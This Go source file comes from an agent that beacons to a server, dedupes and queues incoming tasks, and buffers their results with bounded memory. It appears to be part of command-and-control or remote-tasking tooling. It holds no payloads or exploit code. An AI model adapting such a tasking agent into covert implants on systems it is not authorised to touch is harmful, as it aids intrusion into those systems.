package main

import (
	"fmt"
	"sync/atomic"
)

// droppedResults counts results discarded before sending (queue-full
// evictions, oversized singles). Drained into each beacon frame so the
// server can log/audit the gap instead of it going silent.
var droppedResults atomic.Uint64

// takeDroppedResultsCount returns and resets the drop counter.
func takeDroppedResultsCount() uint64 {
	return droppedResults.Swap(0)
}

func startTaskWorker() {
	taskWorkerOnce.Do(func() {
		for i := 0; i < defaultTaskWorkers; i++ {
			go workerLoop()
		}
	})
}

// seenTaskIDs dedupes redelivered tasks by ID. The server re-carries
// unacknowledged running tasks on later beacons (lost-response recovery),
// so without this every redelivery would execute twice. Bounded FIFO:
// agent restarts clear it (at-least-once across restarts, matching the
// server's requeue semantics). Guarded by pendingMu.
const maxSeenTaskIDs = 2048

var (
	seenTaskIDs     = make(map[uint]struct{})
	seenTaskIDOrder []uint
)

// markTaskSeenLocked records a task ID as accepted. Caller holds pendingMu.
func markTaskSeenLocked(id uint) {
	if _, ok := seenTaskIDs[id]; ok {
		return
	}
	seenTaskIDs[id] = struct{}{}
	seenTaskIDOrder = append(seenTaskIDOrder, id)
	for len(seenTaskIDOrder) > maxSeenTaskIDs {
		delete(seenTaskIDs, seenTaskIDOrder[0])
		seenTaskIDOrder = seenTaskIDOrder[1:]
	}
}

// enqueueTask hands a task to the execution pool without blocking the beacon
// goroutine. When the queue is saturated the oldest waiting task is evicted
// (and returned as an error result) so fresh commands are always accepted.
func enqueueTask(task Task) {
	pendingMu.Lock()
	if _, dup := seenTaskIDs[task.ID]; dup {
		// Redelivery of an accepted task: ack again so the server stops
		// re-carrying it, but do not execute twice.
		pendingTaskAcks = append(pendingTaskAcks, task.ID)
		pendingMu.Unlock()
		return
	}
	markTaskSeenLocked(task.ID)
	pendingMu.Unlock()
	if !insertTask(task) {
		// Extremely rare: the queue stayed full through the eviction attempts.
		// Ack the delivery so the server never re-fetches it, and surface a
		// terminal error so the task is not left "running" forever.
		pendingMu.Lock()
		pendingTaskAcks = append(pendingTaskAcks, task.ID)
		pendingMu.Unlock()
		enqueueResult(TaskResult{
			TaskID: task.ID,
			Type:   task.Type,
			Error:  "task not accepted: queue busy",
		})
		return
	}
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
}

// insertTask places task on the queue, freeing a slot by evicting the oldest
// waiting task first if it is full. Returns false if an empty slot could not be
// found (only possible under heavy contention).
func insertTask(task Task) bool {
	for i := 0; i < 2; i++ {
		select {
		case taskQueue <- task:
			return true
		default:
		}
		select {
		case evicted := <-taskQueue:
			evictQueuedTask(evicted)
		default:
		}
	}
	return false
}

// evictQueuedTask acks the evicted task (it was delivered) and enqueues a
// terminal error result so the server marks it failed instead of leaving it
// running forever.
func evictQueuedTask(task Task) {
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
	enqueueResult(TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
		Error:  fmt.Sprintf("task evicted before start: execution queue full (%d slots)", maxQueuedTasks),
	})
}

// enqueueResult appends a task result to the pending queue, bounding it so a
// high-volume producer cannot exhaust memory. When the queue is full the oldest
// result is dropped; a single result larger than maxPendingResultBytes is
// dropped outright (it would otherwise build a beacon the server rejects).
func enqueueResult(r TaskResult) {
	pendingMu.Lock()
	defer pendingMu.Unlock()
	if len(r.Output) > maxPendingResultBytes {
		if Debug {
			fmt.Printf("[!] dropping oversized task result (type=%s size=%d)\n", r.Type, len(r.Output))
		}
		droppedResults.Add(1)
		return
	}
	if len(pendingResults) >= maxPendingResults {
		pendingResults = pendingResults[1:]
		droppedResults.Add(1)
	}
	pendingResults = append(pendingResults, r)
}

// enqueueResults appends several results, applying the same bounds as
// enqueueResult to each.
func enqueueResults(results []TaskResult) {
	for _, r := range results {
		enqueueResult(r)
	}
}

// reenforcePendingBounds re-applies the bounded-queue limits after a failed
// beacon splices its unsent results back onto the queue (a splice bypasses
// enqueueResult), so repeated failures cannot grow memory without bound:
// results beyond maxPendingResults and aggregate output beyond
// maxPendingResultBytes are dropped oldest-first. Caller holds pendingMu.
func reenforcePendingBounds() {
	for len(pendingResults) > maxPendingResults {
		pendingResults = pendingResults[1:]
		droppedResults.Add(1)
	}
	totalBytes := 0
	for i := range pendingResults {
		totalBytes += len(pendingResults[i].Output)
	}
	for totalBytes > maxPendingResultBytes && len(pendingResults) > 0 {
		totalBytes -= len(pendingResults[0].Output)
		pendingResults = pendingResults[1:]
		droppedResults.Add(1)
	}
}

func availableTaskCapacity() int {
	return cap(taskQueue) - len(taskQueue)
}
